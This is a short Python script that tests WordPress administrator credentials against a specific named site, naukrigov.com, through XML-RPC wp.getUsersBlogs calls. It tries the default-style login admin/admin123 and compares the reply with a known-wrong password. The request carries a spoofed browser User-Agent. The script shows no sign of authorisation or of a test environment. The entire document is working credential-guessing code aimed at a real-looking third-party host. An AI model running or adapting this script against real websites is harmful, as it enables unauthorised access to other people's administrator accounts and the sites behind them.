#!/usr/bin/env python3
"""naukrigov: verify creds via xmlrpc (wp.getUsersBlogs) - definitive"""
import urllib.request, http.cookiejar

UA = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Cache-Control": "no-cache", "Pragma": "no-cache",
    "Content-Type": "text/xml",
}
BASE = "https://naukrigov.com"

def xmlrpc_call(method, params):
    body = '<?xml version="1.0"?><methodCall><methodName>%s</methodName><params>%s</params></methodCall>' % (
        method, params)
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    req = urllib.request.Request(BASE + "/xmlrpc.php", data=body.encode(), headers=UA)
    try:
        r = op.open(req, timeout=20)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def param_str(v):
    return "<param><value><string>%s</string></value></param>" % v

# test admin/admin123
code, resp = xmlrpc_call("wp.getUsersBlogs", param_str("admin") + param_str("admin123"))
print("admin/admin123:", code)
print(resp[:400])
print()

# test with a definitely-wrong password for comparison
code, resp = xmlrpc_call("wp.getUsersBlogs", param_str("admin") + param_str("definitelywrongpw999"))
print("admin/wrong:", code)
print(resp[:400])
